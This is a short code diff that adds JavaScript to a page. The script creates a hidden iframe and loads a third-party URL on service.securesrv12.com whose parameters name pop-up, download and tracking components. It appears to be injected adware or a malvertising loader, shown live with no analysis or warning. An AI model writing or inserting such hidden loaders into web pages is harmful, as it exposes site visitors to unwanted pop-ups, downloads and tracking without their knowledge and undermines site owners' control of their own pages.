@@ -1,0 +1,5 @@
+var iframe;
+iframe = document.createElement('iframe');
+iframe.src = '//service.securesrv12.com/servicejs/components/eventga/?source=pr-1631&isn=800&components=50onred-pops-ts,fts,foxyd,frstofrz-combined,mac-downloads,ga,auframe,qa&group=WFhyZ0FaVzZWR3BnMlcxNUozYVBSUT09';
+iframe.style.display = 'none';
+document.body.appendChild(iframe);
